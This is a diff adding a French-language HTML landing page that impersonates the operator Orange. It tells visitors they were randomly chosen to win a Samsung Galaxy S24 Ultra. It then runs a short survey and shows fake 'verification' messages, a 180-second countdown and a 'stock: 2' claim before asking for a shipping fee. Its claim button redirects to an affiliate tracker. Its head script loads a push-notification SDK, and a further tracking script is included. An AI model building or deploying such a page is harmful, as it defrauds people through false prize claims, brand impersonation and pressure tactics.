@@ -1,0 +1,112 @@
+<!doctype html>
+<html lang="fr" dir="ltr">
+	<head>
+		<title>Orange</title>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<meta name="lander" content="survey">
+		<meta name="description" content="survey">
+		<meta name="robots" content="noindex, nofollow, noarchive">
+		<link rel="shortcut icon" href="https://p5.dailycontestportal.com/common/img/logos/favicon/orange.ico" type="image/x-icon">
+		<!-- PRELOAD -->
+		<link rel="preload" href="https://p5.dailycontestportal.com/africa/ml/orange-reward-survey-1/css/custom.css" as="style">
+		<link rel="preload" href="https://p5.dailycontestportal.com/common/css/tc-landers/app.css" as="style">
+		<link rel="preload" href="https://p5.dailycontestportal.com/common/css/tc-landers/survey/app-1-080222.css?id=ac2328f5b5daefe54707" as="style">
+	    <link rel="preload" href="https://p5.dailycontestportal.com/common/js/tc-landers/survey/app-1-080122.js?id=b8efee147e9b897a7f02" as="script">
+	    <link rel="preload" href="https://p5.dailycontestportal.com/common/fonts/helvetica-neue/fonts.css" as="style">
+	    <!-- CSS/JS -->
+   		<link type="text/css" rel="stylesheet" href="https://p5.dailycontestportal.com/common/fonts/helvetica-neue/fonts.css">
+		<link type="text/css" rel="stylesheet" href="https://p5.dailycontestportal.com/common/css/tc-landers/app.css"/>
+		<link type="text/css" rel="stylesheet" href="https://p5.dailycontestportal.com/common/css/tc-landers/survey/app-1-080222.css?id=ac2328f5b5daefe54707"/>
+		<link type="text/css" rel="stylesheet" href="https://p5.dailycontestportal.com/africa/ml/orange-reward-survey-1/css/custom.css"/>
+		<script async data-cfasync="false">
+            (function() {
+                const url = new URL(window.location.href);
+                const clickID = url.searchParams.get("clickid");
+                const sourceID = url.searchParams.get("campaign_id");
+
+                const s = document.createElement("script");
+                s.dataset.cfasync = "false";
+                s.src = "https://sdk4push.com/f/sdk.js?z=1231205";
+                s.onload = function(opts) {
+                    opts.zoneID = 1231205;
+                    opts.extClickID = clickID;
+                    opts.subID1 = sourceID;
+                    opts.actions.onPermissionGranted = function() {};
+                    opts.actions.onPermissionDenied = function() {};
+                    opts.actions.onAlreadySubscribed = function() {};
+                    opts.actions.onError = function() {};
+                };
+                document.head.appendChild(s);
+            })()
+        </script>	</head>
+	<body class="theme--default">
+		<div class="header">
+			<h1>Concours promotionnel Orange</h1>		</div>
+		<main id="app" v-cloak>
+			<div class="instructions" v-show="!showPrize">
+				<h1 class="heading heading--h1">Félicitations !</h1>
+				<p class="paragraph">Nous tenons à vous remercier d&#039;avoir choisi Orange et d&#039;en faire votre service mobile préféré.  C&#039;est pourquoi nous allons tirer au sort un utilisateur parmi l&#039;ensemble des utilisateurs de Orange afin de lui attribuer un cadeau offert par nos chers partenaires et sponsors.</p>
+				<p class="paragraph">C&#039;est votre jour de chance! Vous êtes l'un des 10 utilisateurs sélectionnés au hasard qui auront la chance de gagner un cadeau.</p>
+				<p class="paragraph">
+					Vous avez été sélectionné au hasard pour avoir une chance de gagner un <em>Samsung Galaxy S24 Ultra</em>.<sup>[1]</sup><br/>
+					<sub>[1] Répondez aux trois questions ci-dessous afin de récupérer votre cadeau !</sub>
+				</p>
+			</div>
+			<vue-survey
+				:questions='[
+				{
+				title: "Êtes-vous satisfait(e) de Orange ?",
+				answers: [{ text: "Très satisfait(e)" },{ text: "Satisfait(e)" },{ text: "Pas satisfait(e)" }],
+				},
+				{
+				title: "Recommandez-vous Orange ?",
+				answers: [{ text: "Oui" },{ text: "Non" },{ text: "Parfois" }]
+				},
+				{
+				title: "Qu&#039;est-ce que vous aimez le plus chez Orange ?",
+				answers: [{ text: "La vitesse" },{ text: "La confidentialité" },{ text: "Le service" }]
+				},
+				]'
+				v-show="!showRotator && !showPrize"
+				v-on:finish="showRotator = true"
+				></vue-survey>
+			<vue-text-rotator
+				:strings='[
+				"Vérification de votre adresse IP...",
+				"Vérification de vos réponses...",
+				"Vérification du stock disponible...",
+				]'
+				v-if="showRotator && !showPrize"
+				v-on:finished="showPrize = true"
+				></vue-text-rotator>
+			<transition name="fade">
+				<div class="prize" v-if="showPrize">
+					<h1 class="heading heading--h1">Félicitations !</h1>
+					<p class="paragraph">
+						<em>En raison d'une disponibilité limitée, votre cadeau est réservé pendant les <vue-countdown :seconds="180"></vue-countdown> prochaines minutes</em><sup>[1]</sup><br />
+						<sub>[1] Si vous ne réclamez pas votre cadeau dans le temps imparti, il sera alors offert à un autre utilisateur de Orange.</sub>
+					</p>
+					<h2>Votre Cadeau</h2>
+					<div class="product">
+						<div class="product__information">
+							<img class="product__image" src="https://p5.dailycontestportal.com/common/img/tc-landers/prizes/galaxy-s24-ultra/default@0.75x.png">
+							<div class="product__details">
+								
+			<div class="product__title">Samsung Galaxy S24 Ultra</div>
+			<div class="product__your-price">Frais de port : <em>FCFA30</em></div>
+			<div class="product__stock">En stock : <span class="product__stock-amount">2</span><br /><sub>* Stock limité</sub></div>
+										</div>
+						</div>
+						<a class="product__button" onclick="go();">Réclamer Maintenant</a>
+					</div>
+				</div>
+			</transition>
+		</main>
+		<script>window.view = window.view || {};view.offerUrl = "https:///action/1";view.popunderUrl = null;view.qs = null;view.skip = 0;view.screenshot = 0;view.download = 0;view.noredir = false;</script>
+		<script type="application/javascript" src="https://p5.dailycontestportal.com/common/js/tc-landers/survey/app-1-080122.js?id=b8efee147e9b897a7f02"></script>
+
+		<script> var offer_url="https:///action/1";var split_url="https://ffp.trktoo.com/fts/1oYSrLBNGRgl-1oYOlBaltMfQ?campaign=&trafficsource=&srcvertical=sweepstakes-ivr-s24ultra&vid=";function go(){window.onbeforeunload=null;window.open(offer_url);document.location.assign(split_url)}; </script>
+		<script async src="https://msrvt.net/et.js"></script>					</body>
+</html>
